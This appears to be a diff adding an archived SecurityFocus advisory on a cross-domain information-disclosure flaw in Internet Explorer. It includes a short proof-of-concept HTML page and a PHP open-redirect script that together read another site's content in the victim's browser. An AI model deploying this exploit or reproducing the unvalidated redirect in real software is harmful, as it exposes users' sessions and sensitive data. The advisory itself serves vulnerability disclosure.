@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/18682/info
+
+Microsoft Internet Explorer is prone to an information-disclosure vulnerability because it fails to properly enforce cross-domain policies.
+
+This issue may allow attackers to access arbitrary websites in the context of a targeted user's browser session. This may allow attackers to perform actions in web applications with the privileges of exploited users or to gain access to potentially sensitive information. This may aid attackers in further attacks.
+
+The following proof of concept is incomplete realization of the idea to demonstrate its feasibility. Windows Server 2003, Enterprise Edition, Service Pack 1, 15/06/2006 Upload the following files to Web server, go to i.html 
+------------------------- i.html ------------------------- 
+<html>
+body onload="setTimeout('alert(o.object.documentElement.outerHTML)',1000)"> 
+<object width=100 height=100 data=r.php?http://www.google.com/123456789 type=text/html id=o></object> 
+</body>
+</html> ------------------------- r.php ------------------------- 
+<?php header("Location: ".$_SERVER["QUERY_STRING"]); ?> i.html displays content of Google Web page.
